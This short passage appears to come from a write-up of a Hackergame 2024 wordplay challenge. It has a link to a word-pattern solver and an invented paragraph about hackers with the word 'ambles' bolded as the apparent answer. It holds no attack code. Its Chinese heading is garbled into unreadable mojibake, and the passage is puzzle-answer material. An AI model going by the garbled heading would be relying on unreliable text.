### âŒã€Œè¡Œå§å°±ç®—æ ‡é¢˜å¯ä»¥å¾ˆé•¿ä½†æ˜¯ flag ä¸€å®šè¦çŸ­ç‚¹ã€

ç¬‘ç‚¹è§£æï¼š[xxblxs](https://www.quinapalus.com/cgi-bin/qat?pat=[hackergmx][hackergmx]bl[hackergmx]s)

>In the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet **ambles**. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The game was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun.
